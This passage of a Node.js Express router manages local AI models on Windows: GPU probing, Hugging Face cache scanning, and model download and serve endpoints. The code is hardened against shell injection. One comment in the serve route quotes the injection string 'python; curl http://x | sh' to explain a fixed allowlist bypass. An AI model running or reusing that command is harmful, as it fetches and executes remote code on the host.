// routes/cookbook.js — Cookbook Hardware: GPU probing, model download/serve, cache scan
// Ported from Python cookbook_routes.py + cookbook_helpers.py + hwfit_routes.py
// Runs directly on the Windows host via child_process (no Docker/tmux/SSH).
const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn, execFile, execFileSync } = require('child_process');
const EventEmitter = require('events');
const os = require('os');
const {
  parseServeCommand, isModelInstalled, checkVramFit, estimateVram, vramErrorMessage,
} = require('./_serveCommand.cjs');

const SESSION_ID_RE = /^[A-Za-z0-9_-]{1,64}$/;
const REPO_ID_RE = /^[A-Za-z0-9][A-Za-z0-9._-]*\/[A-Za-z0-9][A-Za-z0-9._-]*$/;

module.exports = function createCookbookRouter(deps) {
  const router = express.Router();
  const { getLocalFile, getDataFile, writeOSAudit } = deps;

  // Was '../src/blocks/cookbook/data' — from cookbook/api/, that resolved to
  // cookbook/src/blocks/cookbook/data (nested garbage), same depth-miscalculation
  // bug class found in council and deep_research. getDataFile() fixes it structurally.
  const COOKBOOK_DIR = getDataFile ? getDataFile('cookbook') : path.join(__dirname, '../src/blocks/cookbook/data');
  const STATE_FILE = path.join(COOKBOOK_DIR, 'cookbook_state.json');
  const LOGS_DIR = path.join(COOKBOOK_DIR, 'logs');
  try { if (!fs.existsSync(COOKBOOK_DIR)) fs.mkdirSync(COOKBOOK_DIR, { recursive: true }); } catch {}
  try { if (!fs.existsSync(LOGS_DIR)) fs.mkdirSync(LOGS_DIR, { recursive: true }); } catch {}

  // ── Model storage — INSIDE the AEON install by default ──────────
  // The bible's vision: "cookbook downloads local models inside it, so
  // Settings just reads cookbook." No hardcoded ~/.cache assumption —
  // models live in <AEON>/data/cookbook/models so the whole thing is
  // portable (delete the folder = models gone). Power users override with
  // AEON_MODELS_DIR or the standard HF_HOME.
  function modelsRoot() {
    if (process.env.AEON_MODELS_DIR) return process.env.AEON_MODELS_DIR;
    if (process.env.HF_HOME) return process.env.HF_HOME;
    return path.join(COOKBOOK_DIR, 'models');
  }
  // The user's pre-existing global HF cache, scanned as a SECONDARY source
  // so models downloaded before AEON still show up (never assumed to exist).
  function legacyHfCache() {
    return path.join(process.env.USERPROFILE || process.env.HOME || os.homedir() || '', '.cache', 'huggingface', 'hub'); // aeon-path-authority-allow
  }


  // ── Local runtime registry — THE file Settings/kernel read ──────
  const RUNTIME_FILE = getDataFile ? getDataFile('local-runtime.json') : path.join(COOKBOOK_DIR, '..', 'local-runtime.json');
  async function writeLocalRuntime() {
    try {
      let hfModels = scanHfCache(defaultHfCache());
      const legacy = legacyHfCache();
      if (fs.existsSync(legacy) && path.resolve(legacy) !== path.resolve(defaultHfCache())) {
        for (const m of scanHfCache(legacy)) {
          if (!hfModels.some(x => x.repo_id === m.repo_id)) hfModels.push(m);
        }
      }
      const registry = {
        updated: new Date().toISOString(),
        models_dir: modelsRoot(),
        runtimes: { huggingface: { cache: defaultHfCache() } },
        models: hfModels.map(m => ({ id: m.repo_id, backend: 'hf', size: m.size, path: m.path, gguf: !!m.is_gguf, ready: m.status === 'ready' })),
      };
      fs.writeFileSync(RUNTIME_FILE, JSON.stringify(registry, null, 2), 'utf8');
      return registry;
    } catch (e) { return { error: e.message, models: [] }; }
  }
  setTimeout(writeLocalRuntime, 3000);

  // Every model identifier this install can currently serve, from both naming
  // schemes at once: the on-disk HF cache (authoritative, but a scan) and the
  // runtime registry file (cheap, but only as fresh as the last write). Union,
  // never intersection — /model/serve uses this to REFUSE, so a stale miss on
  // either side would block a serve that would have worked. isModelInstalled()
  // is permissive for the same reason.
  function installedModelIds() {
    const ids = new Set();
    try {
      for (const m of scanHfCache(defaultHfCache())) {
        if (m?.repo_id) ids.add(m.repo_id);
      }
    } catch {}
    try {
      const legacy = legacyHfCache();
      if (fs.existsSync(legacy) && path.resolve(legacy) !== path.resolve(defaultHfCache())) {
        for (const m of scanHfCache(legacy)) if (m?.repo_id) ids.add(m.repo_id);
      }
    } catch {}
    try {
      const reg = JSON.parse(fs.readFileSync(RUNTIME_FILE, 'utf8'));
      for (const m of reg?.models || []) if (m?.id) ids.add(m.id);
    } catch {}
    return [...ids];
  }

  // GET /cookbook/runtime — the registry, refreshed on demand
  router.get('/cookbook/runtime', async (req, res) => {
    if (req.query.refresh === '1') return res.json(await writeLocalRuntime());
    try { return res.json(JSON.parse(fs.readFileSync(RUNTIME_FILE, 'utf8'))); }
    catch { return res.json(await writeLocalRuntime()); }
  });

  // ── In-memory task registry ─────────────────────────────────────
  // Tasks survive in memory while running; finished tasks are persisted to state.
  const activeTasks = {};

  function readState() {
    if (!fs.existsSync(STATE_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(STATE_FILE, 'utf8')); } catch { return {}; }
  }

  function writeState(data) {
    fs.writeFileSync(STATE_FILE, JSON.stringify(data, null, 2), 'utf8');
  }

  // ── GPU Probing ─────────────────────────────────────────────────

  // execFile, not exec: no shell is involved, so nothing here can ever be
  // reinterpreted as a command. Callers pass an executable and an argument
  // array. These probes are fixed literals today; the shape guarantees they
  // stay safe if a caller ever becomes dynamic.
  function runCmd(file, args = [], timeout = 10000) {
    return new Promise((resolve) => {
      execFile(file, args, { timeout, windowsHide: true }, (err, stdout, stderr) => {
        resolve({ ok: !err, stdout: (stdout || '').trim(), stderr: (stderr || '').trim(), code: err ? err.code : 0 });
      });
    });
  }

  // NVIDIA GPU probe via nvidia-smi
  async function probeNvidiaGpus() {
    const result = await runCmd('nvidia-smi', ['--query-gpu=index,name,memory.free,memory.total,memory.used,utilization.gpu,uuid', '--format=csv,noheader,nounits']);
    if (!result.ok || !result.stdout) return { gpus: [], error: result.stderr || 'nvidia-smi not found' };

    const gpus = [];
    for (const line of result.stdout.split('\n')) {
      const parts = line.split(',').map(s => s.trim());
      if (parts.length < 7) continue;
      try {
        const idx = parseInt(parts[0]);
        const freeMb = parseInt(parseFloat(parts[2]));
        const totalMb = parseInt(parseFloat(parts[3]));
        const usedMb = parseInt(parseFloat(parts[4]));
        gpus.push({
          index: idx, name: parts[1], uuid: parts[6],
          free_mb: freeMb, total_mb: totalMb, used_mb: usedMb,
          util_pct: parseInt(parseFloat(parts[5])),
          busy: totalMb > 0 && (freeMb / totalMb) < 0.5,
          processes: [],
        });
      } catch { continue; }
    }

    // Best-effort process listing
    if (gpus.length) {
      const procResult = await runCmd('nvidia-smi', ['--query-compute-apps=pid,gpu_uuid,process_name,used_memory', '--format=csv,noheader,nounits'], 5000);
      if (procResult.ok && procResult.stdout) {
        const uuidToIdx = {};
        gpus.forEach(g => { uuidToIdx[g.uuid] = g.index; });
        for (const line of procResult.stdout.split('\n')) {
          const p = line.split(',').map(s => s.trim());
          if (p.length < 4) continue;
          const gIdx = uuidToIdx[p[1]];
          if (gIdx !== undefined) {
            const g = gpus.find(x => x.index === gIdx);
            if (g) g.processes.push({ pid: parseInt(p[0]), name: p[2], used_mb: parseInt(parseFloat(p[3])) });
          }
        }
      }
    }

    return { gpus, backend: 'cuda', source: 'nvidia-smi' };
  }

  router.get('/cookbook/gpus', async (req, res) => {
    if (process.env.VERCEL) return res.json({ ok: false, gpus: [], error: 'GPU probe unavailable in cloud. Use /start from terminal to relay to desktop.', backend: 'cloud' });
    try {
      const result = await probeNvidiaGpus();
      if (result.gpus.length) {
        return res.json({ ok: true, ...result });
      }
      return res.json({ ok: false, gpus: [], error: result.error || 'No GPU probe available' });
    } catch (e) {
      res.json({ ok: false, gpus: [], error: e.message });
    }
  });

  // ── Delete cached HF model ──────────────────────────────────────
  router.post('/cookbook/delete-cache', (req, res) => {
    const { repo } = req.body;
    if (!repo || typeof repo !== 'string') return res.status(400).json({ ok: false, error: 'repo required' });
    if (/[;&|`$]/.test(repo)) return res.status(400).json({ ok: false, error: 'Invalid repo name' });
    const folder = `models--${repo.replace(/\//g, '--')}`;
    // Look in AEON's own model store first, then the legacy global HF cache.
    const roots = [path.join(modelsRoot(), 'hub'), legacyHfCache()];
    try {
      const fs = require('fs');
      for (const cacheDir of roots) {
        const target = path.join(cacheDir, folder);
        if (!target.startsWith(cacheDir)) continue; // traversal guard
        if (fs.existsSync(target)) {
          fs.rmSync(target, { recursive: true, force: true });
          writeLocalRuntime();
          return res.json({ ok: true, deleted: target });
        }
      }
      return res.json({ ok: false, error: 'Model not found in cache' });
    } catch (e) {
      res.json({ ok: false, error: e.message });
    }
  });

  // ── Kill GPU process ────────────────────────────────────────────

  router.post('/cookbook/kill-pid', async (req, res) => {
    const { pid } = req.body;
    if (!pid || pid < 100) return res.status(400).json({ ok: false, error: 'Invalid PID' });
    try {
      execFileSync('taskkill', ['/F', '/T', '/PID', String(parseInt(pid))], { stdio: 'ignore', windowsHide: true });
      res.json({ ok: true, pid });
    } catch (e) {
      res.json({ ok: false, error: e.message });
    }
  });

  // ── Cached Model Scan ──────────────────────────────────────────

  function scanHfCache(cacheDir) {
    const models = [];
    if (!fs.existsSync(cacheDir)) return models;
    const entries = fs.readdirSync(cacheDir).filter(d => d.startsWith('models--'));
    for (const d of entries) {
      const repoId = d.replace('models--', '').replace(/--/g, '/');
      const blobsDir = path.join(cacheDir, d, 'blobs');
      const snapsDir = path.join(cacheDir, d, 'snapshots');
      let size = 0, fileCount = 0, hasIncomplete = false;

      if (fs.existsSync(blobsDir)) {
        for (const f of fs.readdirSync(blobsDir)) {
          try {
            const stat = fs.statSync(path.join(blobsDir, f));
            if (stat.isFile()) { fileCount++; size += stat.size; }
            if (f.endsWith('.incomplete')) hasIncomplete = true;
          } catch {}
        }
      }
      // Fallback: scan snapshots when blobs is empty (Windows HF cache layout)
      if (size === 0 && fs.existsSync(snapsDir)) {
        for (const sd of fs.readdirSync(snapsDir)) {
          const sf = path.join(snapsDir, sd);
          try {
            if (!fs.statSync(sf).isDirectory()) continue;
            for (const f of fs.readdirSync(sf)) {
              const fp = path.join(sf, f);
              try {
                const stat = fs.statSync(fp);
                if (stat.isFile()) { fileCount++; size += stat.size; }
                if (f.endsWith('.incomplete')) hasIncomplete = true;
              } catch {}
            }
          } catch {}
        }
      }

      let isDiffusion = false;
      let isGguf = false;
      const ggufFiles = [];

      if (fs.existsSync(snapsDir)) {
        for (const sd of fs.readdirSync(snapsDir)) {
          const sf = path.join(snapsDir, sd);
          try {
            if (!fs.statSync(sf).isDirectory()) continue;
            if (fs.existsSync(path.join(sf, 'model_index.json'))) isDiffusion = true;
            for (const f of fs.readdirSync(sf)) {
              if (f.toLowerCase().endsWith('.gguf') && !f.startsWith('._')) {
                isGguf = true;
                try {
                  const gs = fs.statSync(path.join(sf, f));
                  ggufFiles.push({ name: f, rel_path: `${sd}/${f}`, size_bytes: gs.size, role: 'model', quant: extractQuant(f) });
                } catch {}
              }
            }
          } catch {}
        }
      }

      models.push({
        repo_id: repoId,
        size: formatSize(size),
        size_bytes: size,
        nb_files: fileCount,
        has_incomplete: hasIncomplete,
        status: hasIncomplete ? 'downloading' : 'ready',
        path: cacheDir,
        is_diffusion: isDiffusion,
        is_gguf: isGguf,
        gguf_files: ggufFiles,
      });
    }
    return models;
  }

  function extractQuant(filename) {
    const m = filename.match(/(?:UD-)?(IQ[0-9]_[A-Z0-9_]+|Q[0-9](?:_[A-Z0-9]+)+|BF16|F16|FP16|F32|Q8_0)/i);
    return m ? m[0].toUpperCase() : '';
  }

  function formatSize(bytes) {
    if (bytes >= 1024 ** 3) return `${(bytes / (1024 ** 3)).toFixed(1)} GB`;
    if (bytes >= 1024 ** 2) return `${Math.round(bytes / (1024 ** 2))} MB`;
    return `${Math.max(1, Math.round(bytes / 1024))} KB`;
  }

  function parseSizeStr(s) {
    const m = (s || '').match(/([\d.]+)\s*(TB|GB|MB|KB)/i);
    if (!m) return 0;
    const n = parseFloat(m[1]);
    const u = m[2].toUpperCase();
    if (u === 'TB') return Math.round(n * 1024 ** 4);
    if (u === 'GB') return Math.round(n * 1024 ** 3);
    if (u === 'MB') return Math.round(n * 1024 ** 2);
    return Math.round(n * 1024);
  }

  function defaultHfCache() {
    return path.join(modelsRoot(), 'hub');
  }

  router.get('/model/cached', (req, res) => {
    if (process.env.VERCEL) return res.json({ models: [], host: 'cloud', note: 'Model cache unavailable in cloud. Relay via desktop bridge.' });
    const modelDirs = [];
    if (req.query.model_dir) {
      for (const d of req.query.model_dir.split(',')) {
        const trimmed = d.trim();
        if (trimmed) modelDirs.push(trimmed);
      }
    }

    // Primary: AEON's own model store. Secondary: the user's global HF cache
    // (only if it exists) so pre-AEON downloads still appear. De-duped by repo.
    let models = scanHfCache(defaultHfCache());
    const legacy = legacyHfCache();
    if (fs.existsSync(legacy) && path.resolve(legacy) !== path.resolve(defaultHfCache())) {
      for (const m of scanHfCache(legacy)) {
        if (!models.some(x => x.repo_id === m.repo_id)) models.push(m);
      }
    }

    // Scan additional model directories
    for (const dir of modelDirs) {
      const expanded = dir.startsWith('~') ? dir.replace('~', os.homedir()) : dir; // aeon-path-authority-allow
      if (fs.existsSync(expanded)) {
        try {
          for (const d of fs.readdirSync(expanded)) {
            if (d.startsWith('.') || d.startsWith('models--')) continue;
            const fp = path.join(expanded, d);
            try {
              if (!fs.statSync(fp).isDirectory()) continue;
            } catch { continue; }
            let isModel = false;
            let totalSize = 0, fileCount = 0;
            const ggufFiles = [];

            const walkDir = (dir) => {
              try {
                for (const f of fs.readdirSync(dir)) {
                  const fp2 = path.join(dir, f);
                  try {
                    const s = fs.statSync(fp2);
                    if (s.isDirectory()) { walkDir(fp2); continue; }
                    if (s.isFile()) {
                      fileCount++; totalSize += s.size;
                      const fl = f.toLowerCase();
                      if (fl.endsWith('.gguf') || fl.endsWith('.safetensors') || fl.endsWith('.bin') || f === 'config.json') isModel = true;
                      if (fl.endsWith('.gguf') && !f.startsWith('._')) {
                        ggufFiles.push({ name: f, rel_path: f, size_bytes: s.size, role: 'model', quant: extractQuant(f) });
                      }
                    }
                  } catch {}
                }
              } catch {}
            };
            walkDir(fp);

            if (isModel && !models.some(m => m.repo_id === d)) {
              models.push({
                repo_id: d, size: formatSize(totalSize), size_bytes: totalSize,
                nb_files: fileCount, has_incomplete: false, status: 'ready',
                path: expanded, is_local_dir: true,
                is_diffusion: fs.existsSync(path.join(fp, 'model_index.json')),
                is_gguf: ggufFiles.length > 0, gguf_files: ggufFiles,
              });
            }
          }
        } catch {}
      }
    }

    res.json({ models, host: 'local' });
  });

  // ── Model Download ─────────────────────────────────────────────

  router.post('/model/download', async (req, res) => {
    const { repo_id, backend, include, hf_token, local_dir } = req.body;
    if (!repo_id) return res.status(400).json({ ok: false, error: 'repo_id is required' });

    if (!REPO_ID_RE.test(repo_id)) {
      return res.status(400).json({ ok: false, error: 'Invalid repo_id' });
    }

    const sessionId = `cookbook-${crypto.randomBytes(4).toString('hex')}`;
    const logFile = path.join(LOGS_DIR, `${sessionId}.log`);
    const pidFile = path.join(LOGS_DIR, `${sessionId}.pid`);

    let cmd, args;
    // Use `hf` CLI if available, else Python huggingface_hub
    // This route needs the Hugging Face CLI or a real Python. AEON installs
    // neither. It used to fall through to a bare 'python', which on stock
    // Windows resolves to the Microsoft Store alias stub — a real file, so
    // spawn succeeds, then it prints a Store advert and exits non-zero. No
    // diagnostic pattern matched that, so the user saw an unexplained failure.
    //
    // Say what is missing, and point at the installer that needs nothing.
    const hfCli = findExecutable('hf');
    if (hfCli) {
      cmd = hfCli;
      args = ['download', repo_id];
      if (include) { args.push('--include', include); }
    } else {
      const py = findExecutable('python') || findExecutable('python3');
      const isStoreStub = py && /WindowsApps/i.test(py);
      if (!py || isStoreStub) {
        return res.status(503).json({
          ok: false,
          error: isStoreStub
            ? 'Python resolves to the Microsoft Store placeholder, not a real interpreter.'
            : 'Neither the Hugging Face CLI ("hf") nor Python was found on PATH.',
          hint: 'Hugging Face downloads need one of those installed. To install a model with no extra tools, use Local models above — AEON downloads and verifies those itself.',
        });
      }
      // allow_patterns is interpolated into a Python literal; keep it to a
      // conservative character set so it cannot terminate the string.
      if (include && !/^[A-Za-z0-9._*\/-]{1,120}$/.test(include)) {
        return res.status(400).json({ ok: false, error: 'include contains unsupported characters.' });
      }
      cmd = py;
      const pyScript = `from huggingface_hub import snapshot_download; snapshot_download('${repo_id}'${include ? `, allow_patterns=['${include}']` : ''})`;
      args = ['-c', pyScript];
    }

    const env = { ...process.env, PYTHONUTF8: '1', PYTHONIOENCODING: 'utf-8' };
    if (hf_token) env.HF_TOKEN = hf_token;
    {
      const raw = local_dir || modelsRoot();
      const expanded = raw.startsWith('~') ? raw.replace('~', os.homedir()) : raw; // aeon-path-authority-allow
      env.HF_HOME = expanded;
      env.HUGGINGFACE_HUB_CACHE = path.join(expanded, 'hub');
      env.HF_HUB_CACHE = path.join(expanded, 'hub');
    }

    try {
      const logStream = fs.createWriteStream(logFile, { flags: 'a' });
      const proc = spawn(cmd, args, {
        env, stdio: ['ignore', 'pipe', 'pipe'],
        windowsHide: true, detached: true,
      });
      proc.unref();

      fs.writeFileSync(pidFile, String(proc.pid), 'utf8');
      // Two sources piping into one destination: pipe() defaults to ending the
      // destination when ITS source ends, so whichever of stdout/stderr closed
      // first was silently ending the log file — the exit-code trailer below
      // then wrote to an already-closed stream and vanished. That's why a
      // failed download showed a bare "error" badge with no diagnosis: the
      // real error text (or even the exit marker) never made it to disk.
      // { end: false } + a single explicit end() in the close handler fixes it.
      logStream.on('error', () => {}); // never let a write-after-end crash the server
      proc.stdout.pipe(logStream, { end: false });
      proc.stderr.pipe(logStream, { end: false });

      const emitter = new EventEmitter();
      activeTasks[sessionId] = {
        type: 'download', status: 'running', query: repo_id,
        started_at: Date.now(), pid: proc.pid, logFile,
        _emitter: emitter, _proc: proc,
      };

      // A spawn that cannot start emits 'error', not 'close'. With no listener
      // that is an unhandled 'error' event — it throws, hits the global
      // uncaughtException handler, and calls process.exit(1). A missing
      // interpreter took the whole kernel down, AFTER the client had already
      // been told { ok: true }. services/local-runtime/download.cjs documents
      // this exact class as fixed; it was never carried to this route.
      proc.on('error', (err) => {
        const task = activeTasks[sessionId];
        const detail = err.code === 'ENOENT'
          ? `Could not start "${cmd}" — not found on PATH. Install it, or use the built-in model installer, which needs no external tools.`
          : `Could not start "${cmd}": ${err.message}`;
        console.error(`[COOKBOOK] download spawn failed (${sessionId}): ${detail}`);
        try {
          logStream.write(`\n=== Failed to start process ===\n${detail}\nDOWNLOAD_FAILED\n`);
          logStream.end();
        } catch { /* stream already gone */ }
        if (task) {
          task.status = 'error';
          task.exitCode = null;
          task.error = detail;
          task._emitter.emit('done', null);
        }
      });

      proc.on('close', (code) => {
        const task = activeTasks[sessionId];
        if (task) {
          task.status = code === 0 ? 'done' : 'error';
          task.exitCode = code;
          logStream.write(`\n=== Process exited with code ${code} ===\n`);
          if (code === 0) logStream.write('DOWNLOAD_OK\n');
          else logStream.write('DOWNLOAD_FAILED\n');
          logStream.end();
          // One-click contract: a finished download registers itself — Settings
          // and the kernel read the refreshed registry with zero extra steps.
          if (code === 0) writeLocalRuntime();
          task._emitter.emit('done', code);
        }
      });

      if (writeOSAudit) {
        writeOSAudit(`COOKBOOK-${sessionId}`, `Started downloading ${repo_id}`);
      }

      res.json({ ok: true, session_id: sessionId, remote: 'local' });
    } catch (e) {
      res.json({ ok: false, error: e.message, session_id: sessionId });
    }
  });

  // ── Model Serve ────────────────────────────────────────────────

  router.post('/model/serve', async (req, res) => {
    const { repo_id, cmd: serveCmd, gpus, hf_token, platform } = req.body;
    if (!repo_id) return res.status(400).json({ ok: false, error: 'repo_id is required' });
    if (!serveCmd) return res.status(400).json({ ok: false, error: 'cmd is required' });

    // This check used to read the FIRST TOKEN only and then hand the entire
    // original string to `bash -c` (or spawn with shell:true). "python; curl
    // http://x | sh" passed the allowlist and ran both halves — an allowlist a
    // reviewer would find and trust, guarding nothing. Worse than an obviously
    // raw endpoint, because it looks validated.
    //
    // Now: the command is TOKENISED, the executable is checked, and the argument
    // vector is passed as an array with no shell anywhere. Shell metacharacters
    // are rejected outright rather than escaped, because nothing legitimate in a
    // model-serve command needs them.
    //
    // The tokeniser moved into _serveCommand.cjs and became quote-aware. The
    // version that shipped here was `cleaned.split(/\s+/)`, which is only
    // correct for a string a shell has already processed: the UI quotes the
    // model path, so llama-server was handed a filename with literal `"`
    // characters in it, and any path containing a space arrived as two
    // arguments. Quotes group; they never introduce interpretation. See that
    // file for the grammar and the ordering argument.
    const parsed = parseServeCommand(serveCmd);
    if (!parsed.ok) {
      return res.status(parsed.status || 400).json({ ok: false, error: parsed.error });
    }
    const { cleaned, env: envAssignments, file: execFileName, args: serveArgs } = parsed;

    // Serving a model that is not on disk was previously a spawn away: the
    // route validated the COMMAND and never the SUBJECT. On a machine with zero
    // models the user got a red badge and no reason. Refuse here, by name.
    // The on-disk check is the escape hatch for an explicit path argument that
    // no registry knows about.
    const argOnDisk = serveArgs.some(a => a.length > 3 && !a.startsWith('-') && (() => {
      try { return fs.existsSync(a); } catch { return false; }
    })());
    if (!argOnDisk && !isModelInstalled(repo_id, installedModelIds())) {
      const short = String(repo_id).split('/').pop() || repo_id;
      return res.status(409).json({
        ok: false,
        code: 'model_not_installed',
        repo_id,
        error: `${short} is not installed. Install it from Local models first.`,
      });
    }

    // Will it actually fit? The "What Fits" tab has ranked models against
    // detected VRAM since this block was ported; serve never asked. quickServe
    // sends `-ngl 99` — every layer on the GPU — so on a 3 GB card a 4B model
    // is a predictable OOM that arrives as a red badge with no reason.
    //
    // Only decisive when it can be: no parameter count in the name, or no GPU
    // probe, and the serve proceeds. `force: true` is the operator override —
    // an estimate must never be the last word on the operator's own hardware.
    if (!req.body.force) {
      let vramGb = 0;
      try {
        const probe = await probeNvidiaGpus();
        // total_mb, not free_mb: the verdict must be reproducible. Judging by
        // free VRAM would make the same command succeed or fail depending on
        // what else happens to be open, which is a worse experience than a
        // stable "this model does not fit this card".
        vramGb = Math.max(0, ...(probe.gpus || []).map(g => (g.total_mb || 0) / 1024));
      } catch { /* no probe — checkVramFit returns fits:null and we proceed */ }

      const fit = checkVramFit({ repoId: repo_id, args: serveArgs, vramGb });
      if (fit.fits === false && fit.fullOffload) {
        const fits = (installedModelIds() || [])
          .map(id => ({ id, est: estimateVram(id) }))
          .filter(m => m.est.neededGb && m.est.neededGb <= vramGb)
          .sort((a, b) => b.est.neededGb - a.est.neededGb)[0];
        return res.status(409).json({
          ok: false,
          code: 'model_exceeds_vram',
          repo_id,
          fit,
          error: vramErrorMessage(fit, repo_id, fits?.id),
        });
      }
    }

    const sessionId = `serve-${crypto.randomBytes(4).toString('hex')}`;
    const logFile = path.join(LOGS_DIR, `${sessionId}.log`);
    const pidFile = path.join(LOGS_DIR, `${sessionId}.pid`);

    const env = { ...process.env, PYTHONUTF8: '1', PYTHONIOENCODING: 'utf-8', ...envAssignments };
    if (hf_token) env.HF_TOKEN = hf_token;
    if (gpus) env.CUDA_VISIBLE_DEVICES = gpus;

    try {
      const logStream = fs.createWriteStream(logFile, { flags: 'a' });
      // No bash, no shell:true. Fixed executable, argument array.
      const proc = spawn(execFileName, serveArgs, {
        env, stdio: ['ignore', 'pipe', 'pipe'],
        windowsHide: true, detached: true, shell: false,
      });

      proc.on('error', (err) => {
        const detail = err.code === 'ENOENT'
          ? `Could not start "${execFileName}" — not found on PATH.`
          : `Could not start "${execFileName}": ${err.message}`;
        console.error(`[COOKBOOK] serve spawn failed (${sessionId}): ${detail}`);
        try { logStream.write(`\n=== Failed to start process ===\n${detail}\n`); logStream.end(); } catch {}
        const t = activeTasks[sessionId];
        if (t) { t.status = 'error'; t.error = detail; }
      });

      proc.unref();
      fs.writeFileSync(pidFile, String(proc.pid), 'utf8');
      // Same double-pipe truncation fix as /model/download above.
      logStream.on('error', () => {});
      proc.stdout.pipe(logStream, { end: false });
      proc.stderr.pipe(logStream, { end: false });

      const emitter = new EventEmitter();
      activeTasks[sessionId] = {
        type: 'serve', status: 'running', query: repo_id,
        started_at: Date.now(), pid: proc.pid, logFile, cmd: cleaned,
        _emitter: emitter, _proc: proc,
      };

      proc.on('close', (code) => {
        const task = activeTasks[sessionId];
        if (task) {
          task.status = code === 0 ? 'done' : 'error';
          task.exitCode = code;
          logStream.write(`\n=== Process exited with code ${code} ===\n`);
          logStream.end();
          task._emitter.emit('done', code);
        }
      });

      res.json({ ok: true, session_id: sessionId, remote: 'local' });
    } catch (e) {
      res.json({ ok: false, error: e.message, session_id: sessionId });
    }
  });

  // ── Task Status ────────────────────────────────────────────────

  router.get('/cookbook/tasks/status', (req, res) => {
    const results = [];
    for (const [sid, task] of Object.entries(activeTasks)) {
      let outputTail = '';
      try {
        if (task.logFile && fs.existsSync(task.logFile)) {
          const content = fs.readFileSync(task.logFile, 'utf8');
          const lines = content.split('\n');
          outputTail = lines.slice(-50).join('\n');
        }
      } catch {}

      let isAlive = false;
      if (task.pid) {
        try { process.kill(task.pid, 0); isAlive = true; } catch { isAlive = false; }
      }
      const selfManaged = false;

      let status = task.status;
      if (status === 'running' && !isAlive && !selfManaged) {
        if (outputTail.includes('DOWNLOAD_OK')) status = 'completed';
        else if (outputTail.includes('Application startup complete')) status = 'ready';
        else status = 'stopped';
        task.status = status;
      }
      if (isAlive && outputTail.includes('Application startup complete')) {
        status = 'ready';
        task.status = status;
      }

      // Parse serve phase
      let phase = '';
      if (task.type === 'serve') {
        if (/Application startup complete/i.test(outputTail)) phase = 'ready';
        else if (/Loading safetensors.*?(\d+)%/.test(outputTail)) {
          const m = outputTail.match(/Loading safetensors.*?(\d+)%/g);
          phase = m ? `loading ${m[m.length - 1].match(/(\d+)%/)[1]}%` : 'loading';
        }
        else if (/Downloading.*?(\d+)%/.test(outputTail)) phase = 'downloading';
        else if (isAlive) phase = 'starting';
      }

      // Download progress
      let progress = '';
      if (task.type === 'download' && isAlive) {
        const pctMatches = [...outputTail.matchAll(/(\d+)%/g)];
        if (pctMatches.length) progress = pctMatches[pctMatches.length - 1][1] + '%';
      }

      // Diagnose errors
      let diagnosis = null;
      if (status === 'error' || status === 'stopped') {
        diagnosis = diagnoseOutput(outputTail);
      }

      results.push({
        session_id: sid,
        type: task.type,
        model: (task.query || '').split('/').pop() || task.query,
        status,
        progress: phase || progress,
        phase,
        diagnosis,
        output_tail: outputTail.slice(-2000),
        exit_code: task.exitCode || null,
        cmd: task.cmd || '',
        remote: 'local',
      });
    }
    res.json({ tasks: results });
  });

  // ── Task Log Stream (SSE) ──────────────────────────────────────

  router.get('/cookbook/task-stream/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    if (!SESSION_ID_RE.test(sessionId)) return res.status(400).end();

    const task = activeTasks[sessionId];
    const logFile = task ? task.logFile : path.join(LOGS_DIR, `${sessionId}.log`);

    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    let lastSize = 0;
    const poll = setInterval(() => {
      try {
        if (!fs.existsSync(logFile)) return;
        const stat = fs.statSync(logFile);
        if (stat.size <= lastSize) return;
        const fd = fs.openSync(logFile, 'r');
        const buf = Buffer.alloc(Math.min(stat.size - lastSize, 4096));
        fs.readSync(fd, buf, 0, buf.length, lastSize);
        fs.closeSync(fd);
        lastSize = stat.size;
        const chunk = buf.toString('utf8').replace(/\r/g, '');
        res.write(`data: ${JSON.stringify({ data: chunk })}\n\n`);
      } catch {}

      // Check if task is done
      const t = activeTasks[sessionId];
      if (t && t.status !== 'running') {
        res.write(`data: ${JSON.stringify({ status: t.status, final: true })}\n\n`);
        clearInterval(poll);
        setTimeout(() => res.end(), 500);
      }
    }, 1000);

    req.on('close', () => clearInterval(poll));
  });

  // ── Stop Task ──────────────────────────────────────────────────

  router.post('/cookbook/task-stop/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const task = activeTasks[sessionId];
    if (!task) return res.json({ ok: false, error: 'Task not found' });

    if (task.pid) {
      try {
        execFileSync('taskkill', ['/F', '/T', '/PID', String(parseInt(task.pid))], { stdio: 'ignore', windowsHide: true });
      } catch {}
    }
    task.status = 'stopped';
    res.json({ ok: true });
  });

  // ── Cookbook State Persistence ──────────────────────────────────

  router.get('/cookbook/state', (req, res) => {
    res.json(readState());
  });

  router.post('/cookbook/state', (req, res) => {
    try {
      const data = req.body || {};
      writeState(data);
      res.json({ ok: true });
    } catch (e) {
      res.json({ ok: false, error: e.message });
    }
  });

  // ── HuggingFace Latest Models ──────────────────────────────────

  let hfLatestCache = { models: [], ts: 0 };

  router.get('/cookbook/hf-latest', async (req, res) => {
    const vramGb = parseFloat(req.query.vram_gb) || 0;
    const limit = parseInt(req.query.limit) || 10;
    const pipeline = req.query.pipeline || 'text-generation';

    const TTL = 600000; // 10 min
    if (Date.now() - hfLatestCache.ts < TTL && hfLatestCache.models.length) {
      let models = hfLatestCache.models;
      if (vramGb > 0) models = models.filter(m => !m.needed_vram_gb || m.needed_vram_gb <= vramGb);
      return res.json({ models: models.slice(0, limit) });
    }

    try {
      const https = require('https');
      const url = `https://huggingface.co/api/models?sort=trendingScore&direction=-1&limit=100&filter=${pipeline}`;
      const data = await new Promise((resolve, reject) => {
        https.get(url, { timeout: 15000 }, (r) => {
          let body = '';
          r.on('data', c => body += c);
          r.on('end', () => { try { resolve(JSON.parse(body)); } catch (e) { reject(e); } });
        }).on('error', reject);
      });

      const EXCLUDE = ['lora', 'adapter', 'peft', 'qlora', 'dataset', 'embedding'];
      const models = [];
      for (const entry of (Array.isArray(data) ? data : [])) {
        const repoId = entry.modelId || entry.id || '';
        if (!repoId) continue;
        const tags = entry.tags || [];
        const tagText = tags.join(' ').toLowerCase();
        const nameText = repoId.toLowerCase();
        if (EXCLUDE.some(e => nameText.includes(e) || tagText.includes(e))) continue;

        // Estimate VRAM
